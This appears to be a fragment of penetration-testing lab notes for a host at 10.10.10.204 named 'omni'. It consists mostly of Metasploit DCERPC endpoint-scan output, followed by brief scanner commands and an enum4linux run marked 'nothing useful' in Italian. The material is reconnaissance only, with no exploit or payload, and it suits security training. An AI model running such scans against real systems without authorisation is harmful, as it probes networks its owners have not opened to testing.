+	[*] 10.10.10.204:135      - 25952c5d-7976-4aa1-a3cb-c35f7ae79d1b v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) [Wireless Diagnostics]
+	[*] 10.10.10.204:135      - 25952c5d-7976-4aa1-a3cb-c35f7ae79d1b v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) [Wireless Diagnostics]
+	[*] 10.10.10.204:135      - 25952c5d-7976-4aa1-a3cb-c35f7ae79d1b v1.0 LRPC (LRPC-43e3b04593e1a37036) [Wireless Diagnostics]
+	[*] 10.10.10.204:135      - 25952c5d-7976-4aa1-a3cb-c35f7ae79d1b v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) [Wireless Diagnostics]
+	[*] 10.10.10.204:135      - de2daf3b-5c16-4613-b204-d810ee629d9e v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) 
+	[*] 10.10.10.204:135      - de2daf3b-5c16-4613-b204-d810ee629d9e v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) 
+	[*] 10.10.10.204:135      - de2daf3b-5c16-4613-b204-d810ee629d9e v1.0 LRPC (LRPC-43e3b04593e1a37036) 
+	[*] 10.10.10.204:135      - de2daf3b-5c16-4613-b204-d810ee629d9e v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) 
+	[*] 10.10.10.204:135      - de2daf3b-5c16-4613-b204-d810ee629d9e v1.0 LRPC (LRPC-b8e304d332442afdf6) 
+	[*] 10.10.10.204:135      - b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) 
+	[*] 10.10.10.204:135      - b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) 
+	[*] 10.10.10.204:135      - b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (LRPC-43e3b04593e1a37036) 
+	[*] 10.10.10.204:135      - b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) 
+	[*] 10.10.10.204:135      - b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (LRPC-b8e304d332442afdf6) 
+	[*] 10.10.10.204:135      - b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (LRPC-219550f04ef5c91d7e) 
+	[*] 10.10.10.204:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) [Impl friendly name]
+	[*] 10.10.10.204:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) [Impl friendly name]
+	[*] 10.10.10.204:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (LRPC-43e3b04593e1a37036) [Impl friendly name]
+	[*] 10.10.10.204:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) [Impl friendly name]
+	[*] 10.10.10.204:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (LRPC-b8e304d332442afdf6) [Impl friendly name]
+	[*] 10.10.10.204:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (LRPC-219550f04ef5c91d7e) [Impl friendly name]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214ea9 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) [Wlan Service]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214ea9 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) [Wlan Service]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214ea9 v1.0 LRPC (LRPC-43e3b04593e1a37036) [Wlan Service]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214ea9 v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) [Wlan Service]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214ea9 v1.0 LRPC (LRPC-b8e304d332442afdf6) [Wlan Service]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214ea9 v1.0 LRPC (LRPC-219550f04ef5c91d7e) [Wlan Service]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214ea9 v1.0 LRPC (LRPC-ef927472b800bc8575) [Wlan Service]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214eb0 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) [Wlan Service LowPriv]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214eb0 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) [Wlan Service LowPriv]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214eb0 v1.0 LRPC (LRPC-43e3b04593e1a37036) [Wlan Service LowPriv]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214eb0 v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) [Wlan Service LowPriv]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214eb0 v1.0 LRPC (LRPC-b8e304d332442afdf6) [Wlan Service LowPriv]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214eb0 v1.0 LRPC (LRPC-219550f04ef5c91d7e) [Wlan Service LowPriv]
+	[*] 10.10.10.204:135      - 266f33b4-c7c1-4bd1-8f52-ddb8f2214eb0 v1.0 LRPC (LRPC-ef927472b800bc8575) [Wlan Service LowPriv]
+	[*] 10.10.10.204:135      - 30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 LRPC (LRPC-2622ed20ae7c9bb281) [NRP server endpoint]
+	[*] 10.10.10.204:135      - 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 LRPC (LRPC-2622ed20ae7c9bb281) [DHCP Client LRPC Endpoint]
+	[*] 10.10.10.204:135      - 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 LRPC (dhcpcsvc) [DHCP Client LRPC Endpoint]
+	[*] 10.10.10.204:135      - 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 LRPC (LRPC-2622ed20ae7c9bb281) [DHCPv6 Client LRPC Endpoint]
+	[*] 10.10.10.204:135      - 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 LRPC (dhcpcsvc) [DHCPv6 Client LRPC Endpoint]
+	[*] 10.10.10.204:135      - 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 LRPC (dhcpcsvc6) [DHCPv6 Client LRPC Endpoint]
+	[*] 10.10.10.204:135      - f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 LRPC (LRPC-2622ed20ae7c9bb281) [Event log TCPIP]
+	[*] 10.10.10.204:135      - f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 LRPC (dhcpcsvc) [Event log TCPIP]
+	[*] 10.10.10.204:135      - f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 LRPC (dhcpcsvc6) [Event log TCPIP]
+	[*] 10.10.10.204:135      - f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 LRPC (eventlog) [Event log TCPIP]
+	[*] 10.10.10.204:135      - f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 PIPE (\pipe\eventlog) \\omni [Event log TCPIP]
+	[*] 10.10.10.204:135      - f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 TCP (49665) 10.10.10.204 [Event log TCPIP]
+	[*] 10.10.10.204:135      - 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 LRPC (LRPC-2622ed20ae7c9bb281) [WinHttp Auto-Proxy Service]
+	[*] 10.10.10.204:135      - 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 LRPC (dhcpcsvc) [WinHttp Auto-Proxy Service]
+	[*] 10.10.10.204:135      - 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 LRPC (dhcpcsvc6) [WinHttp Auto-Proxy Service]
+	[*] 10.10.10.204:135      - 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 LRPC (eventlog) [WinHttp Auto-Proxy Service]
+	[*] 10.10.10.204:135      - 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 PIPE (\pipe\eventlog) \\omni [WinHttp Auto-Proxy Service]
+	[*] 10.10.10.204:135      - 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 TCP (49665) 10.10.10.204 [WinHttp Auto-Proxy Service]
+	[*] 10.10.10.204:135      - 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 LRPC (LRPC-654449f67600182388) [WinHttp Auto-Proxy Service]
+	[*] 10.10.10.204:135      - 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 LRPC (506271f0-b97d-4988-8227-9f4ef026fab0) [WinHttp Auto-Proxy Service]
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-2622ed20ae7c9bb281) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (dhcpcsvc) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (dhcpcsvc6) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (eventlog) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 PIPE (\pipe\eventlog) \\omni 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 TCP (49665) 10.10.10.204 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-654449f67600182388) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (506271f0-b97d-4988-8227-9f4ef026fab0) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-95f267b5b96e665c9f) 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 LRPC (LRPC-2622ed20ae7c9bb281) 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 LRPC (dhcpcsvc) 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 LRPC (dhcpcsvc6) 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 LRPC (eventlog) 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 PIPE (\pipe\eventlog) \\omni 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 TCP (49665) 10.10.10.204 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 LRPC (LRPC-654449f67600182388) 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 LRPC (506271f0-b97d-4988-8227-9f4ef026fab0) 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 LRPC (LRPC-95f267b5b96e665c9f) 
+	[*] 10.10.10.204:135      - a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 LRPC (LRPC-4539cafb37e893d223) 
+	[*] 10.10.10.204:135      - acd792e4-5239-48b6-8baf-7d0a79a64ac0 v0.0 LRPC (SmsRouterSvcRpc) 
+	[*] 10.10.10.204:135      - 6770612b-b256-4b6e-891b-2ff9936755a1 v1.0 LRPC (SmsRouterSvcRpc) 
+	[*] 10.10.10.204:135      - df4df73a-c52d-4e3a-8003-8437fdf8302a v0.0 LRPC (LRPC-f81e83211428b3092a) [WM_WindowManagerRPC\Server]
+	[*] 10.10.10.204:135      - 4bec6bb8-b5c2-4b6f-b2c1-5da5cf92d0d9 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 085b0334-e454-4d91-9b8c-4134f9e793f3 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 8782d3b9-ebbd-4644-a3d8-e8725381919b v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 3b338d89-6cfa-44b8-847e-531531bc9992 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - bdaa0970-413b-4a3e-9e5d-f6dc9d7e0760 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 5824833b-3c1a-4ad2-bdfd-c31d19e23ed2 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 0361ae94-0316-4c6c-8ad8-c594375800e2 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - 20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - 55e6b932-1979-45d6-90c5-7f6270724112 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 55e6b932-1979-45d6-90c5-7f6270724112 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 55e6b932-1979-45d6-90c5-7f6270724112 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 55e6b932-1979-45d6-90c5-7f6270724112 v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - 55e6b932-1979-45d6-90c5-7f6270724112 v1.0 LRPC (LRPC-16f30173bf3663447c) 
+	[*] 10.10.10.204:135      - 76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - 76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 LRPC (LRPC-16f30173bf3663447c) 
+	[*] 10.10.10.204:135      - 88abcbc3-34ea-76ae-8215-767520655a23 v0.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 88abcbc3-34ea-76ae-8215-767520655a23 v0.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 88abcbc3-34ea-76ae-8215-767520655a23 v0.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 88abcbc3-34ea-76ae-8215-767520655a23 v0.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - 88abcbc3-34ea-76ae-8215-767520655a23 v0.0 LRPC (LRPC-16f30173bf3663447c) 
+	[*] 10.10.10.204:135      - 2c7fd9ce-e706-4b40-b412-953107ef9bb0 v0.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - c521facf-09a9-42c5-b155-72388595cbf0 v0.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 1832bcf6-cab8-41d4-85d2-c9410764f75a v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 4dace966-a243-4450-ae3f-9b7bcb5315b8 v2.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 178d84be-9291-4994-82c6-3f909aca5a03 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - e53d94ca-7464-4839-b044-09a2fb8b3ae5 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - fae436b0-b864-4a87-9eda-298547cd82f2 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 082a3471-31b6-422a-b931-a54401960c62 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 6982a06e-5fe2-46b1-b39c-a2c545bfa069 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 0ff1f646-13bb-400a-ab50-9a78f2b7a85a v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 4ed8abcc-f1e2-438b-981f-bb0e8abc010c v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 95406f0b-b239-4318-91bb-cea3a46ff0dc v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 0d47017b-b33b-46ad-9e18-fe96456c5078 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - dd59071b-3215-4c59-8481-972edadc0f6a v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-16f30173bf3663447c) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-edd6b3a5469b8ce005) 
+	[*] 10.10.10.204:135      - 9b008953-f195-4bf9-bde0-4471971e58ed v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 9b008953-f195-4bf9-bde0-4471971e58ed v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 9b008953-f195-4bf9-bde0-4471971e58ed v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 9b008953-f195-4bf9-bde0-4471971e58ed v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - 9b008953-f195-4bf9-bde0-4471971e58ed v1.0 LRPC (LRPC-16f30173bf3663447c) 
+	[*] 10.10.10.204:135      - 9b008953-f195-4bf9-bde0-4471971e58ed v1.0 LRPC (LRPC-edd6b3a5469b8ce005) 
+	[*] 10.10.10.204:135      - 9b008953-f195-4bf9-bde0-4471971e58ed v1.0 LRPC (LRPC-93849f242e3a8f2b71) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-16f30173bf3663447c) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-edd6b3a5469b8ce005) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-93849f242e3a8f2b71) 
+	[*] 10.10.10.204:135      - 697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - 697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - 697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - 697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - 697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 LRPC (LRPC-16f30173bf3663447c) 
+	[*] 10.10.10.204:135      - 697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 LRPC (LRPC-edd6b3a5469b8ce005) 
+	[*] 10.10.10.204:135      - 697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 LRPC (LRPC-93849f242e3a8f2b71) 
+	[*] 10.10.10.204:135      - 697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 LRPC (LRPC-b2aaada66c40fb9495) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-16f30173bf3663447c) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-edd6b3a5469b8ce005) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-93849f242e3a8f2b71) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-b2aaada66c40fb9495) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (csebpub) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (umpo) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (actkernel) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-4602fd0fdbcb0f9f1e) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-c0b09470d8f42930ec) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-16f30173bf3663447c) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-edd6b3a5469b8ce005) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-93849f242e3a8f2b71) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-b2aaada66c40fb9495) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (csebpub) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (dabrpc) 
+	[*] 10.10.10.204:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (OLE8C3A94425B0C61B65E4177217325) 
+	[*] 10.10.10.204:135      - 76f226c3-ec14-4325-8a99-6a46348418af v1.0 LRPC (WMsgKRpc0924A0) 
+	[*] 10.10.10.204:135      - 76f226c3-ec14-4325-8a99-6a46348418af v1.0 PIPE (\PIPE\InitShutdown) \\omni 
+	[*] 10.10.10.204:135      - 76f226c3-ec14-4325-8a99-6a46348418af v1.0 LRPC (WindowsShutdown) 
+	[*] 10.10.10.204:135      - d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 LRPC (WMsgKRpc0924A0) 
+	[*] 10.10.10.204:135      - d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 PIPE (\PIPE\InitShutdown) \\omni 
+	[*] 10.10.10.204:135      - d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 LRPC (WindowsShutdown)
+---------------------------------------------------------------------------------------------------------------
+use auxiliary/scanner/dcerpc/hidden -> show options -> set rhost 10.10.10.204 -> 
+
+---------------------------------------------------------------------------------------------------------------
+use auxiliary/scanner/dcerpc/management -> show options -> set rhost 10.10.10.204 -> run
+	[*] 10.10.10.204:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_access_denied
+	[*] 10.10.10.204:135      - Scanned 1 of 1 hosts (100% complete)
+
+---------------------------------------------------------------------------------------------------------------
+use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor -> show options -> set rhost 10.10.10.204 -> run
+	10.10.10.204 - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a 0.0 OPEN VIA 135 ACCESS GRANTED 00000000000000000000000000000000000000000000000005000000
+
+---------------------------------------------------------------------------------------------------------------
+enum4linux -a -v 10.10.10.204 -> NIENTE DI UTILE
+	[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
+	[V] Dependent program "net" found in /usr/bin/net
+	[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
+	[V] Dependent program "smbclient" found in /usr/bin/smbclient
